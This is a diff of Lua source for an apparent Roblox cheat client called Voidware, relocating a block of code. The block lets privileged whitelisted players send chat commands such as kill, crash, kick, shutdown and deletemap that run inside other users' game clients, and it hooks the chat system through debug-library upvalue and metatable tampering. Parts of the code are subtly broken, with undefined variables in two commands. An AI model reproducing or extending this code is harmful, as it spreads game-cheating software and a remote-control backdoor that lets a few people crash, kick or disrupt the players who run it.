@@ -100,235 +100,6 @@ local function warningNotification(title, text, delay)
 	return (suc and res)
 end
 
-runFunction(function()
-	local destroymapconnection
-	local breakmapconnection
-	local oldcframes = {}
-	local oldparents = {}
-	local voidwareCommands = {
-		kill = function(args, player) 
-			lplr.Character.Humanoid.Health = 0
-			lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-		end,
-		removemodule = function(args, player)
-			pcall(function() 
-				if GuiLibrary.ObjectsThatCanBeSaved[args[3].."OptionsButton"].Api.Enabled then
-					GuiLibrary.ObjectsThatCanBeSaved[args[3].."OptionsButton"].Api.ToggleButton(false)
-				end
-				GuiLibrary.RemoveObject(args[3].."OptionsButton") 
-			end)
-		end,
-		sendclipboard = function(args, player)
-			setclipboard(args[3] or "voidwareclient.xyz")
-		end,
-		uninject = function(args, player)
-			pcall(antiguibypass)
-		end,
-		crash = function(args, player)
-			while true do end
-		end,
-		void = function(args, player)
-			repeat task.wait()
-			if isAlive(lplr, true) then
-			   lplr.Character.HumanoidRootPart.Velocity = Vector3.new(0, -192, 0)
-			else
-				break
-			end
-		    until not isAlive(lplr, true)
-		end,
-		disable = function(args, player)
-			repeat task.wait()
-			if shared.GuiLibrary then 
-				task.spawn(shared.GuiLibrary.SelfDestruct)
-			end
-			until false
-		end,
-		deletemap = function(args, player)
-			for i,v in pairs(game:GetDescendants()) do 
-				if pcall(function() return v.Anchored end) and v.Parent then 
-					oldparents[v] = {object = v, parent = v.Parent}
-					v.Parent = nil
-				end
-			end
-			destroymapconnection = game.DescendantAdded:Connect(function(v)
-				if pcall(function() return v.Anchored end) and v.Parent then 
-					oldparents[v] = {object = v, parent = v.Parent}
-					v.Parent = nil
-				end
-			end)
-		end,
-		physicsmap = function(args, player) 
-			for i,v in pairs(game:GetDescendants()) do 
-				pcall(function() v.Anchored = false end)
-			end
-			if breakmapconnection then return end
-			breakmapconnection = game.DescendantAdded:Connect(function()
-				if pcall(function() return v.Anchored end) and v.Anchored then 
-					oldcframes[v] = {object = v, cframe = v.CFrame}
-					v.Anchored = false
-				end
-			end)
-		end,
-		restoremap = function(args, player)
-			pcall(function() breakmapconnection:Disconnect() end)
-			pcall(function() destroymapconnection:Destroy() end)
-			for i,v in pairs(oldparents) do 
-				pcall(function() v.object.Parent = v.parent end)
-			end
-			for i,v in pairs(oldcframes) do 
-				pcall(function() v.object.CFrame = v.CFrame end) 
-			end
-			oldcframes = {}
-			oldparents = {}
-		end,
-		kick = function(args, player)
-			local kickmessage = "POV: You get kicked by Voidware Infinite | voidwareclient.xyz"
-			if #args > 2 then
-				for i,v in pairs(args) do
-					if i > 2 then
-					   kickmessage = kickmessage ~= "POV: You get kicked by Voidware Infinite | voidwareclient.xyz" and kickmessage.." "..v or v
-					end
-				end
-			end
-			antikickbypass(kickmessage, true)
-		end,
-		sendmessage = function(args, player)
-			local chatmessage = nil
-			if #args > 2 then
-				for i,v in pairs(args) do
-					if i > 2 then
-						chatmessage = chatmessage and chatmessage.." "..v or v
-					end
-				end
-			end
-			if chatmessage ~= nil then
-				sendchatmessage(message)
-			end
-		end,
-		shutdown = function(args, player)
-			game:Shutdown()
-		end
-	}
-	
-	textChatService.OnIncomingMessage = function(message)
-		local properties = Instance.new("TextChatMessageProperties")
-		if message.TextSource then
-			local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
-			if not plr then return end
-			local plrtype, attackable, playerPriority = VoidwareFunctions:GetPlayerType(plr)
-			local bettertextstring = message.PrefixText
-			local tagdata = VoidwareFunctions:GetLocalTag(plr)
-			properties.PrefixText = tagdata.Text ~= "" and "<font color='#"..tagdata.Color.."'>"..tagdata.Text.."</font> " ..bettertextstring or bettertextstring
-			local args = string.split(message.Text, " ")
-			if plr == lplr and message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" and (plrtype == "INF" or plrtype == "OWNER") then
-				for i,v in pairs(voidwareCommands) do message.TextChannel:DisplaySystemMessage(i) end
-			    message.Text = ""
-			end
-			if VoidwarePriority[VoidwareRank] > 1.5 and playerPriority < 2 and plr ~= lplr and not table.find(shared.VoidwareStore.ConfigUsers, plr) then
-				for i,v in pairs(VoidwareWhitelistStore.chatstrings) do
-					if message.Text:find(i) then
-						message.Text = ""
-						task.spawn(function() VoidwareFunctions:CreateLocalTag(plr, "VOIDWARE USER", "FFFF00") end)
-						warningNotification("Voidware", plr.DisplayName.." is using "..v.."!", 60)
-						table.insert(shared.VoidwareStore.ConfigUsers, plr)
-					end
-				end
-			end
-			if VoidwarePriority[VoidwareRank] < playerPriority and ({VoidwareFunctions:GetPlayerType(plr)})[3] > 1.5 then
-			for i,v in pairs(voidwareCommands) do
-				if VoidwareFunctions.WhitelistLoaded and message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() and (VoidwareWhitelistStore.Rank:find(args[2]:upper()) or VoidwareWhitelistStore.Rank:find(args[2]:lower()) or args[2] == lplr.DisplayName or args[2] == lplr.Name or args[2] == tostring(lplr.UserId)) then
-					task.spawn(v, args, plr)
-					local thirdarg = args[3] or ""
-					message.Text = ""
-					break
-				end
-			end
-		end
-		end
-		return properties
-	end
-	task.spawn(function()
-	local function bindchatfunctions(plr)
-		table.insert(vapeConnections, plr.Chatted:Connect(function(message)
-			if shared.VoidwareStore.HookedFunctions.ChatFunctions then return end
-			local args = string.split(message, " ")
-			if plr ~= lplr and #args > 1 and ({VoidwareFunctions:GetPlayerType(plr)})[3] > ({VoidwareFunctions:GetPlayerType()})[3] and ({VoidwareFunctions:GetPlayerType(plr)})[3] > 1.5 then 
-			for i,v in pairs(voidwareCommands) do
-				if VoidwareFunctions.WhitelistLoaded and message:len() >= (i:len() + 1) and message:sub(1, i:len() + 1):lower() == ";"..i:lower() and (VoidwareWhitelistStore.Rank:find(args[2]:upper()) or VoidwareWhitelistStore.Rank:find(args[2]:lower()) or args[2] == lplr.DisplayName or args[2] == lplr.Name or args[2] == tostring(lplr.UserId)) then
-					task.spawn(v, args, plr)
-					break
-				end
-			end
-		end
-		local listofcmds = ""
-		if plr == lplr and message:len() >= 5 and message:sub(1, 5):lower() == ";cmds" and ({VoidwareFunctions:GetPlayerType(lplr)})[3] > 1.5 then
-			for i,v in pairs(voidwareCommands) do
-				listofcmds = listofcmds ~= "" and listofcmds.."\n"..i or i
-			end
-		   game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
-			  Text = listofcmds, 
-			  Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 
-		   })
-		end
-			if plr == lplr or ({VoidwareFunctions:GetPlayerType(plr)})[3] > 1.5 or ({VoidwareFunctions:GetPlayerType()})[3] < 2 then 
-				return 
-			end
-			for i,v in pairs(VoidwareWhitelistStore.chatstrings) do
-				if message:find(i) then
-					task.spawn(function() VoidwareFunctions:CreateLocalTag(plr, "VOIDWARE USER", "FFFF00") end)
-					warningNotification("Voidware", plr.DisplayName.." is using "..v.."!", 60)
-					table.insert(shared.VoidwareStore.ConfigUsers, plr)
-				end
-			end
-		end))
-	end
-	if replicatedStorageService:FindFirstChild("DefaultChatSystemChatEvents") and textChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then 
-		for i,v in pairs(playersService:GetPlayers()) do task.spawn(bindchatfunctions, v) end 
-		table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(v)
-			task.spawn(bindchatfunctions, v)
-		end))
-			for i,v in pairs(getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
-				if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
-					VoidwareStore.oldchatTabs.oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
-					VoidwareStore.oldchatTabs.oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
-					getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
-						local tab = VoidwareStore.oldchatTabs.oldchannelfunc(Self, Name)
-						if tab and tab.AddMessageToChannel then
-							local addmessage = tab.AddMessageToChannel
-							if VoidwareStore.oldchatTabs.oldchanneltabs[tab] == nil then
-								VoidwareStore.oldchatTabs.oldchanneltabs[tab] = tab.AddMessageToChannel
-							end
-							tab.AddMessageToChannel = function(Self2, MessageData)
-								if MessageData.FromSpeaker and playersService[MessageData.FromSpeaker] and vapeInjected then
-									local plr = VoidwareFunctions:GetLocalEntityID(playersService[MessageData.FromSpeaker])
-									local tagdata = plr and tags[plr]
-									if tagdata and tagdata.Text ~= "" then
-										local tagcolor = VoidwareFunctions:RunFromLibrary("Hex2Color3", "GetColor3", tagdata.Color)
-										local tagcolorpack = table.pack(VoidwareFunctions:RunFromLibrary("Hex2Color3", "UnpackColor3", tagdata.Color))
-										MessageData.ExtraData = {
-											NameColor = playersService[MessageData.FromSpeaker].Team == nil and Color3.fromRGB(tagcolorpack[1] + 45, tagcolorpack[2] + 45, tagcolorpack[3] - 10)
-											or playersService[MessageData.FromSpeaker].TeamColor.Color,
-											Tags = {
-												table.unpack(MessageData.ExtraData.Tags),
-												{
-													TagColor = tagcolor,
-													TagText = tagdata.Text,
-												},
-											},
-										}
-									end
-								end
-								return addmessage(Self2, MessageData)
-							end
-						end
-						return tab
-					end
-				end
-		    end
-	    end
-end)
-end)
-
 task.spawn(function()
 	repeat
 	local pingfetected, ping = pcall(function() return math.floor(game:GetService("Stats").PerformanceStats.Ping:GetValue()) end)
@@ -336,8 +107,6 @@ task.spawn(function()
 	task.wait()
     until not vapeInjected
 end)
-
-
 
 local function runFunction(func) func() end
 
@@ -983,6 +752,234 @@ table.insert(vapeConnections, playersService.PlayerRemoving:Connect(function(v)
 	end
 end))
 
+runFunction(function()
+	local destroymapconnection
+	local breakmapconnection
+	local oldcframes = {}
+	local oldparents = {}
+	local voidwareCommands = {
+		kill = function(args, player) 
+			lplr.Character.Humanoid.Health = 0
+			lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+		end,
+		removemodule = function(args, player)
+			pcall(function() 
+				if GuiLibrary.ObjectsThatCanBeSaved[args[3].."OptionsButton"].Api.Enabled then
+					GuiLibrary.ObjectsThatCanBeSaved[args[3].."OptionsButton"].Api.ToggleButton(false)
+				end
+				GuiLibrary.RemoveObject(args[3].."OptionsButton") 
+			end)
+		end,
+		sendclipboard = function(args, player)
+			setclipboard(args[3] or "voidwareclient.xyz")
+		end,
+		uninject = function(args, player)
+			pcall(antiguibypass)
+		end,
+		crash = function(args, player)
+			while true do end
+		end,
+		void = function(args, player)
+			repeat task.wait()
+			if isAlive(lplr, true) then
+			   lplr.Character.HumanoidRootPart.Velocity = Vector3.new(0, -192, 0)
+			else
+				break
+			end
+		    until not isAlive(lplr, true)
+		end,
+		disable = function(args, player)
+			repeat task.wait()
+			if shared.GuiLibrary then 
+				task.spawn(shared.GuiLibrary.SelfDestruct)
+			end
+			until false
+		end,
+		deletemap = function(args, player)
+			for i,v in pairs(game:GetDescendants()) do 
+				if pcall(function() return v.Anchored end) and v.Parent then 
+					oldparents[v] = {object = v, parent = v.Parent}
+					v.Parent = nil
+				end
+			end
+			destroymapconnection = game.DescendantAdded:Connect(function(v)
+				if pcall(function() return v.Anchored end) and v.Parent then 
+					oldparents[v] = {object = v, parent = v.Parent}
+					v.Parent = nil
+				end
+			end)
+		end,
+		physicsmap = function(args, player) 
+			for i,v in pairs(game:GetDescendants()) do 
+				pcall(function() v.Anchored = false end)
+			end
+			if breakmapconnection then return end
+			breakmapconnection = game.DescendantAdded:Connect(function()
+				if pcall(function() return v.Anchored end) and v.Anchored then 
+					oldcframes[v] = {object = v, cframe = v.CFrame}
+					v.Anchored = false
+				end
+			end)
+		end,
+		restoremap = function(args, player)
+			pcall(function() breakmapconnection:Disconnect() end)
+			pcall(function() destroymapconnection:Destroy() end)
+			for i,v in pairs(oldparents) do 
+				pcall(function() v.object.Parent = v.parent end)
+			end
+			for i,v in pairs(oldcframes) do 
+				pcall(function() v.object.CFrame = v.CFrame end) 
+			end
+			oldcframes = {}
+			oldparents = {}
+		end,
+		kick = function(args, player)
+			local kickmessage = "POV: You get kicked by Voidware Infinite | voidwareclient.xyz"
+			if #args > 2 then
+				for i,v in pairs(args) do
+					if i > 2 then
+					   kickmessage = kickmessage ~= "POV: You get kicked by Voidware Infinite | voidwareclient.xyz" and kickmessage.." "..v or v
+					end
+				end
+			end
+			antikickbypass(kickmessage, true)
+		end,
+		sendmessage = function(args, player)
+			local chatmessage = nil
+			if #args > 2 then
+				for i,v in pairs(args) do
+					if i > 2 then
+						chatmessage = chatmessage and chatmessage.." "..v or v
+					end
+				end
+			end
+			if chatmessage ~= nil then
+				sendchatmessage(message)
+			end
+		end,
+		shutdown = function(args, player)
+			game:Shutdown()
+		end
+	}
+	
+	textChatService.OnIncomingMessage = function(message)
+		local properties = Instance.new("TextChatMessageProperties")
+		if message.TextSource then
+			local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
+			if not plr then return end
+			local plrtype, attackable, playerPriority = VoidwareFunctions:GetPlayerType(plr)
+			local bettertextstring = message.PrefixText
+			local tagdata = VoidwareFunctions:GetLocalTag(plr)
+			properties.PrefixText = tagdata.Text ~= "" and "<font color='#"..tagdata.Color.."'>"..tagdata.Text.."</font> " ..bettertextstring or bettertextstring
+			local args = string.split(message.Text, " ")
+			if plr == lplr and message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" and (plrtype == "INF" or plrtype == "OWNER") then
+				for i,v in pairs(voidwareCommands) do message.TextChannel:DisplaySystemMessage(i) end
+			    message.Text = ""
+			end
+			if VoidwarePriority[VoidwareRank] > 1.5 and playerPriority < 2 and plr ~= lplr and not table.find(shared.VoidwareStore.ConfigUsers, plr) then
+				for i,v in pairs(VoidwareWhitelistStore.chatstrings) do
+					if message.Text:find(i) then
+						message.Text = ""
+						task.spawn(function() VoidwareFunctions:CreateLocalTag(plr, "VOIDWARE USER", "FFFF00") end)
+						warningNotification("Voidware", plr.DisplayName.." is using "..v.."!", 60)
+						table.insert(shared.VoidwareStore.ConfigUsers, plr)
+					end
+				end
+			end
+			if VoidwarePriority[VoidwareRank] < playerPriority and ({VoidwareFunctions:GetPlayerType(plr)})[3] > 1.5 then
+			for i,v in pairs(voidwareCommands) do
+				if VoidwareFunctions.WhitelistLoaded and message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() and (VoidwareWhitelistStore.Rank:find(args[2]:upper()) or VoidwareWhitelistStore.Rank:find(args[2]:lower()) or args[2] == lplr.DisplayName or args[2] == lplr.Name or args[2] == tostring(lplr.UserId)) then
+					task.spawn(v, args, plr)
+					local thirdarg = args[3] or ""
+					message.Text = ""
+					break
+				end
+			end
+		end
+		end
+		return properties
+	end
+	task.spawn(function()
+	local function bindchatfunctions(plr)
+		table.insert(vapeConnections, plr.Chatted:Connect(function(message)
+			if shared.VoidwareStore.HookedFunctions.ChatFunctions then return end
+			local args = string.split(message, " ")
+			if plr ~= lplr and #args > 1 and ({VoidwareFunctions:GetPlayerType(plr)})[3] > ({VoidwareFunctions:GetPlayerType()})[3] and ({VoidwareFunctions:GetPlayerType(plr)})[3] > 1.5 then 
+			for i,v in pairs(voidwareCommands) do
+				if VoidwareFunctions.WhitelistLoaded and message:len() >= (i:len() + 1) and message:sub(1, i:len() + 1):lower() == ";"..i:lower() and (VoidwareWhitelistStore.Rank:find(args[2]:upper()) or VoidwareWhitelistStore.Rank:find(args[2]:lower()) or args[2] == lplr.DisplayName or args[2] == lplr.Name or args[2] == tostring(lplr.UserId)) then
+					task.spawn(v, args, plr)
+					break
+				end
+			end
+		end
+		local listofcmds = ""
+		if plr == lplr and message:len() >= 5 and message:sub(1, 5):lower() == ";cmds" and ({VoidwareFunctions:GetPlayerType(lplr)})[3] > 1.5 then
+			for i,v in pairs(voidwareCommands) do
+				listofcmds = listofcmds ~= "" and listofcmds.."\n"..i or i
+			end
+		   game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+			  Text = listofcmds, 
+			  Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 
+		   })
+		end
+			if plr == lplr or ({VoidwareFunctions:GetPlayerType(plr)})[3] > 1.5 or ({VoidwareFunctions:GetPlayerType()})[3] < 2 then 
+				return 
+			end
+			for i,v in pairs(VoidwareWhitelistStore.chatstrings) do
+				if message:find(i) then
+					task.spawn(function() VoidwareFunctions:CreateLocalTag(plr, "VOIDWARE USER", "FFFF00") end)
+					warningNotification("Voidware", plr.DisplayName.." is using "..v.."!", 60)
+					table.insert(shared.VoidwareStore.ConfigUsers, plr)
+				end
+			end
+		end))
+	end
+	if replicatedStorageService:FindFirstChild("DefaultChatSystemChatEvents") and textChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then 
+		for i,v in pairs(playersService:GetPlayers()) do task.spawn(bindchatfunctions, v) end 
+		table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(v)
+			task.spawn(bindchatfunctions, v)
+		end))
+			for i,v in pairs(getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
+				if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == "table" and getmetatable(debug.getupvalues(v.Function)[1]) and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel then
+					VoidwareStore.oldchatTabs.oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
+					VoidwareStore.oldchatTabs.oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
+					getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
+						local tab = VoidwareStore.oldchatTabs.oldchannelfunc(Self, Name)
+						if tab and tab.AddMessageToChannel then
+							local addmessage = tab.AddMessageToChannel
+							if VoidwareStore.oldchatTabs.oldchanneltabs[tab] == nil then
+								VoidwareStore.oldchatTabs.oldchanneltabs[tab] = tab.AddMessageToChannel
+							end
+							tab.AddMessageToChannel = function(Self2, MessageData)
+								if MessageData.FromSpeaker and playersService[MessageData.FromSpeaker] and vapeInjected then
+									local plr = VoidwareFunctions:GetLocalEntityID(playersService[MessageData.FromSpeaker])
+									local tagdata = plr and tags[plr]
+									if tagdata and tagdata.Text ~= "" then
+										local tagcolor = VoidwareFunctions:RunFromLibrary("Hex2Color3", "GetColor3", tagdata.Color)
+										local tagcolorpack = table.pack(VoidwareFunctions:RunFromLibrary("Hex2Color3", "UnpackColor3", tagdata.Color))
+										MessageData.ExtraData = {
+											NameColor = playersService[MessageData.FromSpeaker].Team == nil and Color3.fromRGB(tagcolorpack[1] + 45, tagcolorpack[2] + 45, tagcolorpack[3] - 10)
+											or playersService[MessageData.FromSpeaker].TeamColor.Color,
+											Tags = {
+												table.unpack(MessageData.ExtraData.Tags),
+												{
+													TagColor = tagcolor,
+													TagText = tagdata.Text,
+												},
+											},
+										}
+									end
+								end
+								return addmessage(Self2, MessageData)
+							end
+						end
+						return tab
+					end
+				end
+		    end
+	    end
+	end)
+end)
 
 local WhitelistFunctions = {StoredHashes = {}, WhitelistTable = {WhitelistedUsers = {}}, Loaded = false, CustomTags = {}, LocalPriority = 0}
 do
